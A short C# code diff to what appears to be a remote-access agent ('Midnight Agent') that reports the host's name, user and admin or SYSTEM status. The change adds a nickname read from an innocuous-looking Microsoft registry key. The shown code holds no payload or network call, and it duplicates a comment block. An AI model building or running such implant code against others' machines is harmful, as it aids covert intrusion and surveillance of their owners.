@@ -82,9 +82,15 @@ namespace MidnightAgent.Core
         /// <summary>
         /// Get full system info message
         /// </summary>
+        /// <summary>
+        /// Get full system info message
+        /// </summary>
         public static string GetFullInfo()
         {
-            return $@"🌙 Midnight Agent #{Id}
+            string nick = GetNickname();
+            string idDisplay = string.IsNullOrEmpty(nick) ? $"#{Id}" : $"#{Id} ({nick})";
+
+            return $@"🌙 Midnight Agent {idDisplay}
 
 🖥️ Hostname: {Hostname}
 👤 Username: {Username}
@@ -95,6 +101,18 @@ namespace MidnightAgent.Core
 🔐 Admin: {(IsAdmin ? "Yes ✅" : "No ❌")}
 ⚡ SYSTEM: {(IsSystem ? "Yes ✅" : "No ❌")}
 📦 Version: {Version}";
+        }
+
+        private static string GetNickname()
+        {
+            try
+            {
+                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\InputPersonalization"))
+                {
+                    return key?.GetValue("UserTag")?.ToString();
+                }
+            }
+            catch { return null; }
         }
 
         private static string GenerateId()
